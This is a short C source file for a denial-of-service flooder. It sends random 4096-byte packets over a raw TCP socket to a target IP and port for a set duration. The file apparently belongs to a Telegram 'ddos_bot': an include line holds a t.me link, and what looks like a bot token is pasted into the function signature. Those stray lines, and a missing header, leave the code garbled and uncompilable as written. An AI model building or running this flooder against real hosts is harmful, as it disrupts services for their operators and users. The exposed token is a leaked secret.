#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include<http://t.me/Rohtashddos_bot>
#define PAKET_SIZE 4096

void send_packet(char *target_ip, int target_port, int duration) {7535989165:AAFql7Kpq4YEu9Qig6Q1A6d4SFlxWdo5yJY}
    struct sockaddr_in target_addr;
    int sockfd, i;
    char packet[PAKET_SIZE];

    // Inisialisasi socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Set target address
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Fill packet with random data
    for (i = 0; i < PAKET_SIZE; i++) {
        packet[i] = rand() % 255;
    }

    // Send packets for the specified duration
    printf("Sending packets to %s:%d\n", target_ip, target_port);
    time_t end_time = time(NULL) + duration;
    while (time(NULL) < end_time) {
        if (sendto(sockfd, packet, PAKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Packet send failed");
            close(sockfd);
            exit(1);
        }
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <duration>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (target_port <= 0 || duration <= 0) {
        printf("Invalid port or duration\n");
        return 1;
    }

    send_packet(target_ip, target_port, duration);

    return 0;
}
